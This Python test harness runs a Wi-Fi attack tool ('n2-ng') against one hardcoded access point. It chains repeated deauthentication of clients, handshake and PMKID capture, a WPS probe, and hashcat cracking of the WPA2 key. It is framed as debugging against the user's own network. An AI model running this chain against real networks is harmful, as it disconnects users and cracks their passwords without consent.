#!/usr/bin/env python3
"""Live debug run for n2-ng v1.7.3 against the user's own AP (Indepentester).

Exercises the exact classes the GUI uses, with full logging:
  A. AirodumpWorker.start_lock  -> correct -01 cap, growing, CSV parse
  B. CaptureManager gate + directed deauth -> handshake_found fires, loop stops
  C. PmkidAttacker (clientless)
  D. OmniAttackOrchestrator full chain (PROFILE->PMKID->WPS->HANDSHAKE->...->CRACK)
"""

import queue
import subprocess
import sys
import threading
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent / "src"))
import n2ng.main as n2
from n2ng.omni import OmniAttackOrchestrator

BSSID = "22:87:EC:67:42:B1"
ESSID = "Indepentester"
CHANNEL = 6
MON = "wlan0mon"

LOG_PATH = Path(__file__).resolve().parent / "logs" / f"live_debug_{time.strftime('%Y%m%d_%H%M%S')}.log"
LOG_PATH.parent.mkdir(exist_ok=True)


def log(msg: str):
    line = f"[{time.strftime('%H:%M:%S')}] {msg}"
    print(line, flush=True)
    with LOG_PATH.open("a") as fh:
        fh.write(line + "\n")


def main():
    q = queue.Queue()
    settings = n2.Settings()
    worker = n2.AirodumpWorker(q, settings)
    cm = n2.CaptureManager(q, log)
    attack = n2.AttackController(log)
    sta_mac = open(f"/sys/class/net/{MON}/address").read().strip()
    log(f"n2-ng {n2.__version__} live debug vs {ESSID} ({BSSID}) ch{CHANNEL} on {MON} (sta {sta_mac})")

    # --- Phase A: lock capture -------------------------------------------------
    prefix = n2.target_capture_prefix(ESSID, BSSID)
    lock_prefix = f"{prefix}_lock"
    ok, err = worker.start_lock(MON, CHANNEL, BSSID, prefix)
    log(f"A: start_lock ok={ok} err={err} prefix={lock_prefix}")
    assert ok, "start_lock failed"
    time.sleep(4)
    cap = n2.latest_airodump_cap_path(lock_prefix)
    log(f"A: latest cap = {cap}")
    assert cap is not None and cap.name.endswith("-01.cap"), f"suffix drift: {cap}"
    cm.set_active_cap(cap)
    size0 = cap.stat().st_size
    time.sleep(6)
    size1 = cap.stat().st_size
    log(f"A: cap growing {size0} -> {size1} bytes")
    assert size1 > size0, "cap not growing"
    nets, clients = worker.get_latest()
    log(f"A: CSV parsed: {len(nets)} net(s), {len(clients)} client(s): "
        f"{[c.get('station') for c in clients]}")
    client_macs = [c["station"] for c in clients if c.get("bssid", "").upper() == BSSID.upper() and c.get("station")]
    log(f"A: target clients: {client_macs}")

    # --- Phase B: deauth + capture gate ----------------------------------------
    log("B: starting gated deauth loop (10s interval, stops on handshake/PMKID)")
    rounds = 0
    t0 = time.monotonic()
    while rounds < 8 and not (cm.handshake_found or cm.pmkid_found):
        attack.deauth_all(BSSID, MON, count=1, clients=client_macs)
        rounds += 1
        for _ in range(20):  # 10s, polling like the GUI's 5s timer (but faster)
            cm.poll()
            if cm.handshake_found or cm.pmkid_found:
                break
            time.sleep(0.5)
        log(f"B: round {rounds} handshake_found={cm.handshake_found} "
            f"pmkid_found={cm.pmkid_found} challenge={cm.challenge_seen} "
            f"cap={cap.stat().st_size}B elapsed={time.monotonic()-t0:.0f}s")
    log(f"B: DONE gate={'handshake' if cm.handshake_found else ('pmkid' if cm.pmkid_found else 'NONE')} "
        f"after {rounds} round(s), {time.monotonic()-t0:.0f}s")
    hs_22000 = cap.with_suffix(".22000")
    if hs_22000.exists():
        log(f"B: 22000 file: {hs_22000} ({hs_22000.stat().st_size}B): {hs_22000.read_text().strip()[:80]}...")

    if "--quick" in sys.argv:
        worker.stop()
        attack.stop_all()
        assert not worker.is_running(), "airodump still running"
        log("QUICK MODE — phases A+B done, skipping C/D")
        return

    # --- Phase C: clientless PMKID ----------------------------------------------
    pmkid_out = Path(prefix).parent / f"pmkid_{ESSID}.22000"
    pmk = n2.PmkidAttacker(BSSID, ESSID, MON, sta_mac, pmkid_out, log, event_queue=q, attempts=2, timeout=8)
    pmk.start()
    pmk.join(timeout=30)
    log(f"C: PMKID result: {pmk.result_path}")

    # --- Phase D: OMNI full chain ------------------------------------------------
    net = {"bssid": BSSID, "essid": ESSID, "channel": str(CHANNEL), "privacy": "WPA2",
           "cipher": "CCMP", "auth": "PSK", "power": "-40"}
    profile = n2.security_profile(net)
    log(f"D: profile={profile}")
    target_dir = Path(prefix).parent
    wordlist = n2.default_hashcat_wordlist()
    log(f"D: wordlist={wordlist}")

    # Probe real WPS state so OMNI's WPS stage actually runs.
    # wash runs until killed; on timeout keep its partial stdout.
    wps_lines: list[str] = []
    try:
        wash = subprocess.run(["wash", "-i", MON, "-c", str(CHANNEL), "-s", "n"],
                              capture_output=True, text=True, timeout=30)
        wps_lines = wash.stdout.splitlines()
    except subprocess.TimeoutExpired as exc:
        partial = exc.stdout or ""
        if isinstance(partial, bytes):
            partial = partial.decode(errors="replace")
        wps_lines = partial.splitlines()
    except Exception as exc:
        log(f"D: wash probe failed: {exc}")
    log(f"D: wash: {[l.strip() for l in wps_lines if BSSID.upper() in l.upper()]}")

    def pmkid_factory():
        return n2.PmkidAttacker(BSSID, ESSID, MON, sta_mac,
                                target_dir / f"pmkid_omni_{ESSID}.22000", log,
                                event_queue=q, attempts=2, timeout=8)

    def crack_cmd(batch):
        return n2.build_hashcat_command(batch, wordlist, attack_mode="0")

    omni = OmniAttackOrchestrator(
        net=net, profile=profile, mon_iface=MON, sta_mac=sta_mac,
        attack=attack, capture_manager=cm, log_func=log, event_queue=q,
        pmkid_factory=pmkid_factory, target_dir=target_dir,
        build_crack_cmd=crack_cmd if wordlist else None,
        wps_lines=wps_lines, clients=client_macs, wordlist=wordlist,
        pmkid_window=25, max_deauth_rounds=4, deauth_interval=10,
        max_lockouts=2, crack_timeout=300,
    )
    omni.start()
    while omni.is_alive():
        omni.join(timeout=5)
        cm.poll()  # keep the capture gate fed while OMNI deauths
    log("D: OMNI report:\n" + omni.summary())

    # --- Teardown -----------------------------------------------------------------
    worker.stop()
    attack.stop_all()
    killed_procs = attack.stop_all()
    log(f"E: teardown, worker stopped, attack procs killed={killed_procs}")
    assert not worker.is_running(), "airodump still running"
    log("ALL PHASES DONE — log: " + str(LOG_PATH))


if __name__ == "__main__":
    main()
